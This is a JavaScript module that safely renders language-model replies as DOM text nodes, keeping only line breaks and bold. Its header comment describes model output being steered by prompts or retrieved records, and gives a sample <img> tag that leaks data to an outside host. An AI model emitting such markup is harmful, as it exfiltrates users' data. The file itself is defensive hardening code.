/* ─────────────────────────────────────────────────────────────────────────────
   FAMILISTA — MODEL TEXT RENDERER

   Text written by a language model is untrusted input. A reply can carry
   whatever the prompt, a retrieved record or an attacker steered it to say,
   including markup: <img src="https://elsewhere/?d=…"> leaks data through a
   request the image policy allows, and a script or handler is one CSP change
   away from running. So model text never reaches the browser's HTML parser.

   This file turns a reply into nodes with createElement and createTextNode
   only. The formatting the assistant screens have always shown is kept: a line
   break is a <br>, and **bold** is a <strong>. Everything else, markup
   included, is shown as the characters it is.

   No innerHTML, no insertAdjacentHTML, no DOMParser, no template, no
   attributes and no inline style: the one class it sets is styled by app.css.
   ───────────────────────────────────────────────────────────────────────────── */
(function (root, factory) {
  if (typeof module === 'object' && module.exports) module.exports = factory();
  else root.FamilistaModelText = factory();
}(typeof self !== 'undefined' ? self : this, function () {
  'use strict';

  var BOLD_CLASS = 'ai-text-strong';

  function asText(value) {
    if (value == null) return '';
    return typeof value === 'string' ? value : String(value);
  }

  // A reply as lines, each line as runs of { text, bold }. A ** with no partner
  // on its line stays literal, as it did before.
  function parse(value) {
    return asText(value).replace(/\r\n?/g, '\n').split('\n').map(function (line) {
      var runs = [];
      var re = /\*\*(.*?)\*\*/g;
      var at = 0;
      var m;
      while ((m = re.exec(line)) !== null) {
        if (m.index > at) runs.push({ text: line.slice(at, m.index), bold: false });
        if (m[1]) runs.push({ text: m[1], bold: true });
        at = re.lastIndex;
      }
      if (at < line.length) runs.push({ text: line.slice(at), bold: false });
      return runs;
    });
  }

  function toFragment(value, doc) {
    var frag = doc.createDocumentFragment();
    parse(value).forEach(function (runs, i) {
      if (i > 0) frag.appendChild(doc.createElement('br'));
      runs.forEach(function (run) {
        var text = doc.createTextNode(run.text);
        if (!run.bold) { frag.appendChild(text); return; }
        var strong = doc.createElement('strong');
        strong.className = BOLD_CLASS;
        strong.appendChild(text);
        frag.appendChild(strong);
      });
    });
    return frag;
  }

  // Replace what the container shows with the reply.
  function render(container, value, doc) {
    var d = doc || container.ownerDocument;
    while (container.firstChild) container.removeChild(container.firstChild);
    container.appendChild(toFragment(value, d));
    return container;
  }

  return { BOLD_CLASS: BOLD_CLASS, parse: parse, toFragment: toFragment, render: render };
}));
